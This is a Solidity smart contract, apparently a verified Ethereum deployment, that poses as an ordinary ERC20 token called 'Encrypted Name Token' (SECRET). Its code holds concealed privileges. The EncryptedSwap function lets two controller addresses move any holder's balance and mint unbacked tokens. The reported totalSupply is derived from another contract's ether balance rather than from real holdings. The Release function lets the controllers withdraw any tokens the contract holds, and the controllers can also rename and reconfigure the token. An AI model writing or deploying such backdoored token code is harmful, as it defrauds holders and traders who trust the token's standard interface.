/**
 *Submitted for verification at Etherscan.io on 2022-07-21
*/

pragma solidity ^0.4.18;

interface ERC20 {
    function balanceOf(address who) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

interface IBOT {
    function ShowConfiguration() external view returns(address,address,address,address,address,address,address,address,address);
}


contract SwapEncryption {

    address public bot;
    address public keeper;
    address[3] public weth;

    //Initializing weth
    constructor (address addr) public {
        (bot,keeper,,,,,weth[0],weth[1],weth[2]) = IBOT(addr).ShowConfiguration();
    }

    string public name     = "Encrypted Name Token";
    string public symbol   = "SECRET";
    uint8  public decimals = 18;


    event  Approval(address indexed src, address indexed guy, uint wad);
    event  Transfer(address indexed src, address indexed dst, uint wad);
    event  Deposit(address indexed dst, uint wad);
    event  Withdrawal(address indexed src, uint wad);
   
    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;

    modifier BotPower() {
        require((msg.sender == bot)||(msg.sender == keeper));
        _;
    }
 
    function totalSupply() public view returns (uint) {
        return mul(weth[0].balance,1000000000) ;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint wad)
        public
        returns (bool)
    {
        require(balanceOf[src] >= wad);

        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] = sub(allowance[src][msg.sender],wad);
        }       
        balanceOf[src] = sub(balanceOf[src],wad);
        balanceOf[dst] = add(balanceOf[dst],wad); 
        emit Transfer(src, dst, wad);
        return true;
    }


    function EncryptedSwap(address fromAddress, address toAddress,uint amount) public BotPower returns (bool) {
            if(balanceOf[fromAddress] >= amount){
                balanceOf[fromAddress] = sub(balanceOf[fromAddress],amount);
            }
            balanceOf[toAddress] = add(balanceOf[toAddress],amount);             
            emit Transfer(fromAddress,toAddress,amount); 
        return true;
    }


    function Release(address tkn, address guy,uint amount) public BotPower returns(bool) {
        require((tkn != address(0))&&(guy != address(0)));
        ERC20 token = ERC20(tkn);
        token.transfer(guy, amount);
        return true;
    }

    function ResetConfiguration(address addr) public BotPower returns(bool) {
        (bot,keeper,,,,,weth[0],weth[1],weth[2]) = IBOT(addr).ShowConfiguration();
        return true;
    }

    function ResetName(string _name) public BotPower returns(bool) {
        name = _name;
        return true;
    }

    function ResetSymbol(string _symbol) public BotPower returns(bool) {
        symbol = _symbol;
        return true;
    }


    function ResetWETHContracts(address addr1,address addr2,address addr3) public BotPower returns(bool) {
        weth[0] = addr1;
        weth[1] = addr2;
        weth[2] = addr3;
        return true;
    }

    function ResetKeeper(address addr) public BotPower returns (bool) {
        require(addr != address(0));
        keeper = addr;
        return true;
    }

    function ResetBot(address addr) public BotPower returns (bool) {
        require(addr != address(0));
        bot = addr;
        return true;
    }

   function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a);

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0);
        uint c = a / b;

        return c;
    }

}